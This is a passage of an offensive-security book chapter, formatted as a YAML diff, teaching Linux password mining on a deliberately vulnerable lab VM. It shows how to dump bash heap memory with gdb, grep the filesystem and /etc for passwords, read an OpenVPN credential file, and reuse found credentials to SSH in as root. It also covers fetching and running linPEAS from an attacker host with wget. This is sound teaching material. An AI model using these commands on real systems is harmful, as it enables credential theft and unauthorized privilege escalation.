@@ -1,0 +1,1039 @@
+- en: '*Chapter 11*: Linux Password Mining'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Now that you have an understanding of how to utilize kernel exploits on Linux
+    in order to elevate your privileges, we can begin exploring the process of searching
+    for and identifying locally stored credentials on Linux systems. This process
+    will involve searching for specific passwords and application credentials that
+    can be used to elevate our privileges directly, without the use of any exploits.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This chapter will focus on the various tools and techniques that can be used
+    to find and identify passwords that can consequently provide us with an elevated
+    session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will start off by taking a look at how to extract passwords and credentials
+    stored in memory, after which we will take a look at how to identify credentials
+    in application and operating system configuration files. We will then conclude
+    the chapter by exploring the process of searching and identifying passwords logged
+    in history files.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we''re going to cover the following main topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: What is password mining?
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Extracting passwords from memory
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Searching for passwords in configuration files
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Searching for passwords in history files
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: To follow along with the demonstrations in this chapter, you will need to ensure
+    that you have familiarity with Linux Terminal commands.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You can view this chapter''s code in action here: [https://bit.ly/2Y3qA3w](https://bit.ly/2Y3qA3w)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: What is password mining?
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: You should already be familiar with the password mining process and its importance
+    as we covered this in [*Chapter 7*](B17389_07_Final_PG_ePub.xhtml#_idTextAnchor101),
+    *Windows Password Mining*; however, there are a few nuances in the process when
+    dealing with Linux systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Password mining is the process of searching for and enumerating encrypted or
+    clear-text passwords stored in persistent or volatile memory on the target system.
+    The primary objective of this process revolves around identifying potentially
+    useful user account and application passwords that can expand our authority over
+    a target system and potentially provide us with elevated privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Given the nature of Linux distributions and deployment use cases, this process
+    will differ from target to target. It is therefore important to have a good understanding
+    of how and where passwords, both encrypted and clear-text, are stored on Linux
+    systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: It is also important to understand that this process relies on a series of vulnerabilities
+    that are a result of an organization's or individual's password security practices.
+    Poor password security practices are the primary target for attackers as they
+    provide a straightforward access vector without the need for further system exploitation
+    or compromise.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Because of the numerous amounts of credentials that are required by various
+    platforms and applications, employees and individuals are prone to saving their
+    credentials on their systems in cleartext, usually in **.doc**, **.txt**, or **.xlsx**
+    files for ease of access, and are most likely to use weaker passwords comprised
+    of events, names, or dates that are relevant to them. This is a significant threat
+    to the security of an organization and as a result, most organizations enforce
+    a password security policy as a means of remediating these issues. Password security
+    policies are used to establish a baseline security level for user account passwords
+    and enforce the secure storage and use of stronger passwords comprised of words
+    (both uppercase and lowercase), symbols, and numbers with a recommended minimum
+    length of eight digits. However, this gives rise to the occurrence of password
+    reuse, where employees and individuals are likely to reuse the same password for
+    multiple accounts, primarily because of the complex nature of the passwords they
+    are required to use. This allows attackers to gain access to multiple accounts
+    by compromising a single account password.
+  prefs: []
+  type: TYPE_NORMAL
+- en: An additional security vulnerability or risk involves Linux user account passwords
+    and how they are stored. Linux encrypts and stores user account passwords locally.
+    After initial access has been obtained by an attacker, user account hashes can
+    be dumped from memory and can be cracked depending on the length and strength
+    of the password. We will explore the advantages and drawbacks of this technique
+    later in this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: From an organizational standpoint, Linux is also used to host third-party business-critical
+    applications that come with their own security vulnerabilities. Most of these
+    applications implement some form of access control and consequently require user
+    authentication in the form of a username and password combination. These applications
+    are also prone to storing credentials locally in either clear-text or in an encrypted
+    format. After successful exploitation, attackers can locate these credentials,
+    decrypt them (if weak), and use them to gain access to the application and consequently
+    expand their domain of control over a system or network.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that you have an understanding of what password mining is, we can take a
+    look at how to set up our target **virtual machine** (**VM**) that we will use
+    for the remainder of the chapters in this book.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Setting up our environment
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: In this chapter, we will be utilizing a customized Debian 6 VM that has been
+    configured to be vulnerable and that will provide us with a robust environment
+    to learn and demonstrate the password mining process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To begin setting up the VM, follow the procedures outlined next:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in the process involves downloading the VM **Open Virtualization
+    Appliance** (**OVA**) file required to set up the target system with VirtualBox.
+    The OVA file can be downloaded from the following link: [https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0](https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0).'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: In order to import the VM into VirtualBox, you will need to double-click the
+    **Debian 6 64-bit (Workshop)** file, as highlighted in the following screenshot:![Figure
+    11.1 – VM file
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_001.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.1 – VM file
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After double-clicking on the OVA file, you will be prompted with the VirtualBox
+    import wizard, as highlighted in the following screenshot:![Figure 11.2 – VirtualBox
+    import wizard
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_002.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.2 – VirtualBox import wizard
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The VirtualBox import wizard will prompt you to specify the VM base folder,
+    as highlighted in the preceding screenshot. After this, you can click on the **Import**
+    button to begin the import process.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After the VM has been imported into VirtualBox, you will need to add it to
+    the **Virtual Hacking Lab** network we created in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030)
+    of this book, *Setting Up Our Lab*, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 11.3 – VirtualBox network settings'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_003.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 11.3 – VirtualBox network settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: Once you have configured the VM to use the custom network, you can save the
+    changes and boot up the VM to get started.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You will require an initial foothold on the system in order to follow along
+    with the techniques and demonstrations in this chapter. You can gain an initial
+    foothold on the system by remotely authenticating to the target via **Secure Shell**
+    (**SSH**) with the following credentials: username (**user**) and password (**password321**).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: These credentials will provide you with an unprivileged session on the target
+    system that we can use as a starting point to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Extracting passwords from memory
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: We can begin the password mining process by exploring an uncommon technique
+    that can be used to extract application passwords from memory. The viability and
+    success of this technique will depend on the type of applications that are running
+    on the target and its deployment use case.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Applications and services that utilize username and password authentication
+    may store credentials in user-space memory, either in cleartext or in an encrypted
+    state. Dumping and analyzing the memory of a particular service may reveal credentials
+    pertinent to the application. We can use these credentials to gain access and
+    take control of the particular service; alternatively, we can use the discovered
+    credentials for authentication to other user accounts in order to elevate our
+    privileges. This is because many users and system administrators are prone to
+    reusing passwords for various applications and their user accounts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can use the **GNU Debugger** (**GDB**) to dump the memory of a running service
+    or application in order to reveal clear-text or encrypted passwords.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: GDB is a portable debugger that runs on various Unix-like systems and can be
+    used to debug various programming languages.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This technique requires a procedural approach and will vary from system to system
+    based on the types of applications that are running on the target.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can begin the process by following the procedures outlined next:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in the process involves identifying services running on the
+    target system that utilize authentication or services that may have been used
+    to authenticate with other services. This can be done by running the following
+    command on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**ps -ef**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will outline a list of all running services on the system and their
+    corresponding **process identifier** (**PID**).
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, we are able to identify various
+    services running as **user**:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.4 – Bash process](Images/B17389_11_004.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_IMG
+- en: Figure 11.4 – Bash process
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can also manually search for specific services that are likely to utilize
+    authentication. This can be done by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**ps -ef | grep <SERVICE_NAME>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command utilizes the **grep** utility to limit the results to the processes
+    that match the keyword.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As highlighted in *Figure 11.4*, we are able to identify a Bash session and
+    its corresponding PID.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can utilize GDB to dump the memory of the **Bash** service in order to reveal
+    credentials that may have been entered in the Bash session earlier on by other
+    users. This can be done by running the following command on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**gdb -p <PID>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command is used to specify the specific PID that you want to analyze with
+    GDB. In this case, ensure that you specify the PID for the Bash service, as highlighted
+    in *Figure 11.4*.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next step involves listing all mapped memory regions for the process. This
+    can be done by running the following command in the GDB:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**info proc mappings**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'If successful, the GDB should output the mapped address spaces for the service,
+    as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.5 – GDB mapped address spaces'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_005.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.5 – GDB mapped address spaces
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Take note of the start and end addresses for the heap, as highlighted in the
+    preceding screenshot, as we will need these addresses in order to dump the memory
+    of the service.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now dump the memory of the service by specifying the start and end addresses
+    of the heap allocation. This can be done by running the following command in the
+    GDB:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**dump memory <OUTPUT_FILE> <START_ADDRESS> <STOP_ADDRESS>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will output the contents of the heap memory for the Bash service
+    into an output file that we can analyze.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Heap memory, also known as dynamic memory, is used by applications to store
+    global variables.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After dumping the memory of the Bash service into a file, we can utilize the
+    **strings** utility to identify potentially useful information and credentials.
+    This can be done by running the following command on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**strings /<OUTPUT_FILE> | grep passw**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will identify all strings in the output file and search for any
+    occurrences of the **passw** keyword.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, we are able to identify an authentication
+    command to MySQL with the username and password specified in cleartext:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.6 – MySQL credentials dumped from memory'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_006.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.6 – MySQL credentials dumped from memory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We can now use these credentials to gain root access to the MySQL server, as
+    the credentials specified in the authentication command use the root account.
+    However, the target isn't running a MySQL server.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, we can utilize the MySQL credentials to try to gain access to
+    the root account on the target system via SSH in the event the root user has reused
+    their password for other services. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**ssh root@<TARGET-IP>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, authentication with the MySQL credentials
+    is successful, and you should now have root access to the target system:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.7 – Successful SSH authentication'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_007.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 11.7 – Successful SSH authentication
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We have now been able to successfully elevate our privileges by dumping and
+    analyzing the memory of a specific service. In this case, we were able to get
+    access to the root account on the system primarily because of poor security practices
+    by the administrator or root user. The following mistakes or poor security practices
+    led to the successful elevation of our privileges:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Password reuse by the administrator or root user.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The MySQL authentication command included the username and the password.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: These mistakes are commonly made by users and system administrators on Linux
+    servers and should always be tested as they can reveal very important information
+    that can be used to elevate your privileges on the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that you have an understanding of how to dump the memory of processes and
+    how to search for and identify credentials, we can begin exploring the process
+    of searching for passwords in configuration files.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Searching for passwords in configuration files
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: An application provides an enticing target for attackers as weaknesses and vulnerabilities
+    in it and its storage of credentials can lead to complete system compromise or
+    elevated privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This section will be focused on finding and enumerating application credentials.
+    The techniques demonstrated in this section will depend on the type of target
+    you are dealing with and its deployment use case. In our particular case, our
+    target VM is set up to be a server and has various applications installed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step of this process involves searching for passwords in various files
+    stored locally; this will allow us to identify any user or application passwords
+    in text or configuration files. This can be achieved through the use of inbuilt
+    Linux utilities that allows us to search for specific strings in files with specific
+    extensions.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Searching for passwords
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'We can get started with the password searching process by following the procedures
+    outlined next:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can start off by searching for files that contain passwords. This can be
+    done by leveraging the **grep** utility, as follows:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**grep --color=auto -rnw ''/'' -ie "PASSWORD" --color=always 2> /dev/null**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This command will perform a recursive scan from the root of the filesystem
+    and will output a list of files that contain the **password** keyword and will
+    color code the results accordingly, as illustrated in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.8 – grep results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_008.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.8 – grep results
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: It is recommended to alternate between the use of the **password** keyword and
+    abbreviated variations of the keyword, such as **pass** or **passw**. This is
+    because configuration files will store credentials under different names and may
+    use abbreviated versions of the keyword.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The command will output quite a bit of data, which can make it difficult to
+    identify any potentially useful credentials. As a result, we will need to narrow
+    down our search to specific directories that contain useful configuration files
+    for applications and services. This can be done by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**grep --color=auto -rnw ''/etc'' -ie "PASSWORD" --color=always 2> /dev/null**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This command will limit the results to the configuration files found in the
+    **/etc** directory, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.9 – Customized grep search results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_009.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.9 – Customized grep search results
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In this case, we weren't able to identify any useful credentials, so we can
+    turn our attention to the **user** home directory.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can customize the search keyword in order to ensure that we do not miss
+    any matches for the keyword by utilizing the **pass** keyword instead of **password**.
+    This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**grep --color=auto -rnw ''/home/user'' -ie "PASS" --color=always 2> /dev/null**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This command will output a list of all files in the **user** account home directory
+    with the **pass** keyword, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.10 – Customized grep search results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_010.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.10 – Customized grep search results
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we are able to identify an OpenVPN configuration file in the
+    **user** account home directory that contains the location of the OpenVPN credentials.
+    We can display the contents of the file highlighted in the preceding screenshot
+    by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**cat /etc/openvpn/auth.txt**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output of this command is shown here:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.11 – OpenVPN credentials'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_011.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.11 – OpenVPN credentials
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Displaying the contents of the file reveals the credentials for the **user**
+    account but does not reveal the credentials for any other account on the system,
+    as highlighted in the preceding screenshot.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: If we did not know the credentials for the **user** account beforehand, this
+    would be useful information as we would have obtained the password for the **user**
+    account without cracking the password hash for this account.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'You can also utilize the **find** utility in conjunction with the **grep**
+    utility in order to fine-tune your searches based on the configuration of your
+    target. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will output a list of files in the **/etc** directory that contain
+    the **pass** keyword.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we are not able to find any new files that contain credentials
+    that we can use, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.12 – find search results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_012.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.12 – find search results
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can also search for files that contain the **pass** keyword in the **user**
+    account home directory by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**find /home/user -type f -exec grep -i -I "PASS" {} /dev/null \;**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output is shown here:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.13 – Custom find search results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_013.png)Figure 11.13 – Custom find search results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In this case, we are able to identify an **Internet Relay Chat** (**IRC**) client
+    configuration file that contains the **user** account IRC credentials; however,
+    we are not able to locate any other user or application credentials that can be
+    used for privilege escalation.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: We can automate this process through the use of an automated enumeration script.
+    In this case, we will utilize **Linux Privilege Escalation Awesome Script** (**linPEAS**)
+    to automate the password mining process on our target.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**linPEAS** is a local Linux enumeration script that searches and scans for
+    potential vulnerabilities and enumerates all important system information that
+    can be used to stage a privilege escalation attack.'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The linPEAS binary can be downloaded from the GitHub repository here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Ensure you download the **linpeas** Bash script, as highlighted in the following
+    screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.14 – linPEAS Bash script'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_014.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 11.14 – linPEAS Bash script
+  prefs: []
+  type: TYPE_NORMAL
+- en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
+    file to our target VM. This cannot be done automatically as we do not have a meterpreter
+    session. As a result, we will need to make use of Linux-specific utilities to
+    download the binary.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Transferring files
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'In order to transfer the **linpeas.sh** file to our target, we will need to
+    set up a web server on our Kali VM that will be used to host the file so that
+    we can download it on the target system. This can be done by following the procedures
+    outlined here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
+    Python module to serve the binary file. This can be done by running the following
+    command in the directory where the **linpeas.sh** binary is stored:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python -m SimpleHTTPServer 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**SimpleHTTPServer** is a Python module for Python 2 and is also available
+    for Python 3 under the name **http.server**.'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
+    will serve the files in the directory on the Kali VM **Internet Protocol** (**IP**)
+    address on port **80**:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.15 – SimpleHTTPServer linPEAS'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_015.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.15 – SimpleHTTPServer linPEAS
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In order to download the **linpeas.sh** file on to the target system, we can
+    utilize the **wget** utility. Before we can download the binary, however, we need
+    to navigate to a directory where we have read and write permissions. In this case,
+    we will navigate to the temporary directory, as illustrated in the following screenshot:![Figure
+    11.16 – Linux temporary directory
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_016.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.16 – Linux temporary directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **wget** utility to download the file from the Kali VM to
+    our target system. This can be done by running the following command on the target
+    system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output of this command is shown here:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 11.17 – Transferring the linPEAS script'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_017.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 11.17 – Transferring the linPEAS script
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
+    file should be downloaded and saved with the name we specified.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **linpeas.sh** script to automate the password mining process.
+    This can be done by running the **linpeas.sh** script. However, before we do that,
+    we need to ensure the script has executable permissions. This can be done by running
+    the following command on the target:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**chmod +x linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now run the **linpeas.sh** script by running the following command on
+    the target:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**./linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will enumerate and output all relevant system information pertinent
+    to privilege escalation. In this case, we are only interested in the files that
+    contain credentials.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we are able to identify the IRC client credentials we found earlier
+    with manual techniques, as highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.18 – IRC client password'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_018.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 11.18 – IRC client password
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We were also able to identify the OpenVPN user credentials, as highlighted
+    in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.19 – OpenVPN credentials'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_11_019.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 11.19 – OpenVPN credentials
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **linpeas.sh** script does not reveal any other credentials or passwords
+    stored locally on the system. As a result, we will have to narrow down our search
+    to specific files that are likely to contain potentially useful information.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Our search for passwords and credentials has not been fruitful as we were not
+    able to locate any credentials that would allow us to elevate our privileges further.
+    However, we were only able to find the **user** account credentials.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The next step in the process will involve searching for passwords in history
+    files on the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Searching for passwords in history files
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: One of the advantages of running Linux is the extensive amount of logging that
+    is afforded to a user. By default, Linux will automatically log all Bash commands
+    entered on a system by a user unless specified otherwise. This is an advantage
+    for system administrators as it provides a system of accountability whereby all
+    user actions and commands are logged and can be analyzed historically; however,
+    if not configured correctly, attackers can leverage this functionality to search
+    for and identify important information such as credentials from various history
+    files that log the commands entered by a user.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Companies and organizations mitigate this inherent configuration vulnerability
+    by disabling the user command history from being logged. Alternatively, they can
+    also enforce the deletion of these logs once a user has completed a session. However,
+    in many cases, users on a Linux system may forget to clear their history, and
+    as a result, attackers can sift through the user's history with the objective
+    of locating potentially useful information.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The steps for searching and identifying locally stored credentials through
+    various techniques are as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in this process involves analyzing the **user** account Bash
+    history file. The **bash_history** file logs all commands input by a user in a
+    Bash session and is located by default in the user''s home directory. We can utilize
